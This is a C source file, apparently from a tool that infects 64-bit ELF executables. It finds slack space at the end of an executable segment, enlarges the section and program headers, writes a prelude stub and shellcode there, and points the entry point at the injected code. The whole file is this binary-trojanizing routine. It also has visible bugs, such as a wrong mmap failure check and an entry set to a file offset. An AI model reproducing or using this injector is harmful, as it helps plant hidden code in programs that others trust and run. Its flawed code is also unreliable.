#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <elf.h>
#include "elfinfo.h"
#include "debug.h"

static int _get_file_size(const char *filepath)
{
    struct stat st;
    if (stat(filepath, &st) < 0)
        return -1;
    return st.st_size;
}

void init_fmap(fmap_t *file, const char *filename)
{
    int size;
    int fd;
    void *base = NULL;

    ACT("Mapping file: %s", filename);

    size = _get_file_size(filename);

    if (size < 0) {
        PANIC("Failed to get file size");
    }

    fd = open(filename, O_RDONLY);
    if (fd == -1) {
        PANIC("Failed to open file");
        return false;
    }

    base = (void *)mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
    if (!base) {
        PANIC("Failed to map file");
    }

    // file = (fmap_t *)malloc(sizeof(fmap_t));
    if (!file) {
        PANIC("Failed to allocate memory for file mapping");
    }

    file->fd = fd;
    file->size = size;
    file->base = base;

    return;
}

void deinit_fmap(fmap_t *file)
{
    if (!file)
        return;

    if (file->base)
        munmap(file->base, file->size);
    if (file->fd != -1)
        close(file->fd);
    // free(file);
}

shinfo *find_last_ex_section(fmap_t *elf, size_t shcd_size) {

    ACT("Finding last section in executable segment ...");

    Elf64_Ehdr *ehdr;
    Elf64_Phdr *phdrs;
    Elf64_Phdr *phtable;
    Elf64_Shdr *shdrs;
    char *shstr;
    uint32_t segment_end;
    shinfo *sinfo = NULL;
    size_t i, j;
    uint32_t prelude_size;
    bool found = false;

    ehdr    = (Elf64_Ehdr *)elf->base;
    phdrs    = (Elf64_Phdr *)((uintptr_t)elf->base + ehdr->e_phoff);
    phtable = (Elf64_Phdr *)((uintptr_t)elf->base + ehdr->e_phoff);
    shdrs = (Elf64_Shdr *)((uintptr_t)elf->base + ehdr->e_shoff);
    shstr = (char *)((uintptr_t)elf->base + shdrs[ehdr->e_shstrndx].sh_offset);

    for (i = 0; i < ehdr->e_phnum; i++) {

        /* try to find a segment with X permission */
        if (!(phdrs[i].p_flags & PF_X))
            continue;

        OK("Found executable segment at 0x%08lx (size:%08lx)", phdrs[i].p_offset, phdrs[i].p_filesz);

        /* Found the executable segment, now find the last section in the segment */
        segment_end = phdrs[i].p_offset + phdrs[i].p_memsz;

        for (j = 0; j < ehdr->e_shnum; j++) {

            if (shdrs[j].sh_addr + shdrs[j].sh_size == segment_end) {

                found = true;
                sinfo = (shinfo *)malloc(sizeof(shinfo));

                if (!sinfo) {
                    PANIC("malloc failed");
                }

                strncpy(sinfo->name, shstr + shdrs[j].sh_name, MAX_SH_NAMELEN-1);
                sinfo->offset  = (uint32_t)shdrs[j].sh_offset;
                sinfo->size    = (uint32_t)shdrs[j].sh_size;
                sinfo->secidx  = (uint32_t)j;
                break;
            }
        }

        if (found == false) {
            ACT("No sections in segment!? Searching for a new RX segment ...");
            continue;
        }

        OK("Found %s at 0x%08x with a size of %u bytes. within segment[%d] (0x%08x-0x%08x)", 
            sinfo->name, sinfo->offset, sinfo->size, i, phtable[i].p_offset, phtable[i].p_offset + phtable[i].p_filesz);

        sinfo->segidx = i;

        /* Check if the payload is able to fit without expanding the segment past the next page boundary */
        prelude_size = (uintptr_t)&g_prelude_end - (uintptr_t)&g_prelude_start;

        if (shdrs[j+1].sh_addr - shdrs[j].sh_addr - shdrs[j].sh_size >= shcd_size + prelude_size) {
            OK("Payload can fit on last page of RX segment");
            goto out;
        }else {
            FATAL("unimpl segment expand");
        }

    }
    FATAL("RX segment not found");
out:
    return sinfo;

}

/**/
void adjust_size(fmap_t *elf, shinfo *last_sinfo, target_t *target, size_t shcd_size)
{
    size_t      size;
    uint32_t    newoff;
    size_t      i;
    uint32_t    prelude_size;
    Elf64_Ehdr* ehdr;
    Elf64_Shdr* shdrs;
    Elf64_Phdr *phdrs;

    ehdr    = (Elf64_Ehdr *)elf->base;
    shdrs   = (Elf64_Shdr *)((uintptr_t)elf->base + ehdr->e_shoff);
    phdrs   = (Elf64_Phdr *)((uintptr_t)elf->base + ehdr->e_phoff);

    /* build/prelude.bin between the g_prelude_end and g_prelude_start */
    prelude_size = (uintptr_t)&g_prelude_end - (uintptr_t)&g_prelude_start;

    ehdr = (Elf64_Ehdr *)elf->base;

    /* Set patch information */
    size = last_sinfo->size;
    target->offset = last_sinfo->offset + size; /* insert payload into the end of last section */
    target->size = shcd_size + prelude_size;

    /* fixup section' size */
    ACT("expand %s section' size from 0x%08x to 0x%08x", last_sinfo->name,
        shdrs[last_sinfo->secidx].sh_size , shdrs[last_sinfo->secidx].sh_size + shcd_size + prelude_size);
    shdrs[last_sinfo->secidx].sh_size += target->size;
    
    ACT("Adjusting Program Headers ...");

    {
        i = last_sinfo->segidx;

        ACT("Adjusting RX segment[%d] program header size from 0x%08x to 0x%08x", 
            i, phdrs[i].p_filesz, phdrs[i].p_filesz + shcd_size + prelude_size);
            
        phdrs[i].p_filesz += target->size;
        phdrs[i].p_memsz  += target->size;

        OK("Now segment' scope is 0x%08x - 0x%08x", phdrs[i].p_offset, phdrs[i].p_offset + phdrs[i].p_filesz);
    }
    return;
}

void adjust_entry(fmap_t *elf, target_t *target, uint32_t *old_entry)
{
    Elf64_Ehdr* ehdr;
    Elf64_Shdr* shdrs;
    Elf64_Phdr* phdrs;

    ehdr    = (Elf64_Ehdr *)elf->base;
    shdrs   = (Elf64_Shdr *)((uintptr_t)elf->base + ehdr->e_shoff);
    phdrs   = (Elf64_Phdr *)((uintptr_t)elf->base + ehdr->e_phoff);

    *old_entry = ehdr->e_entry;
    ehdr->e_entry = (uint32_t)target->offset;
    OK("Modifying ELF e_entry(at offset 0x%08x) to point to the shellcode at offset 0x%08x ", 
        *old_entry, target->offset);
    
}

void writeback(fmap_t *elf, fmap_t *shcd, char *outfile, target_t *target, uint32_t* old_entry)
{
    int fd;
    int n;
    size_t remaining;
    bool rv = false;
    uint8_t *prelude_buf = NULL;
    uint32_t prelude_size;

    ACT("writeback ELF to %s ...", outfile);

    fd = open(outfile, O_RDWR | O_CREAT | O_TRUNC, 0777);
    if (fd == -1) {
        PANIC("Failed to create patched ELF");
    }

    ACT("Writing first part of ELF (size: %u) (i.e. ELF header - end of last section)", target->offset);

    /* write until the start of shellcode location s*/
    ck_write(fd, elf->base, target->offset, "None");

    prelude_size = (uintptr_t)&g_prelude_end - (uintptr_t)&g_prelude_start;
    prelude_buf = (uint8_t *)malloc(prelude_size);

    if (!prelude_buf) {
        PANIC("Failed to allocate memory for the prelude buffer");
    }
    memcpy(prelude_buf, &g_prelude_start, prelude_size);

    ACT("Setting old and new e_entry values in prelude ...");
    *(uint32_t *)(prelude_buf + 2) = *old_entry;     // old_entry
    *(uint32_t *)(prelude_buf + 6) = target->offset;  // new_entry

    ACT("Writing prelude (size: %u) ...", prelude_size);
    ck_write(fd, prelude_buf, prelude_size, "None");


    ACT("Writing shellcode (size: %u)", shcd->size);
    ck_write(fd, shcd->base, shcd->size, "None");

    assert_eq(prelude_size + shcd->size, target->size);
    remaining = elf->size - (target->offset + target->size);

    if (!remaining) {
        // maybe executable segment at the tail of the file??? maybe this idea impossible
        goto done;
    }

    /* Write rest of the ELF */
    ACT("Writing remaining data (size: %lu)", remaining);
    ck_write(fd, elf->base + target->offset + target->size, remaining, "None");

done:
    free(prelude_buf);
    close(fd);
    OK("writeback over");
}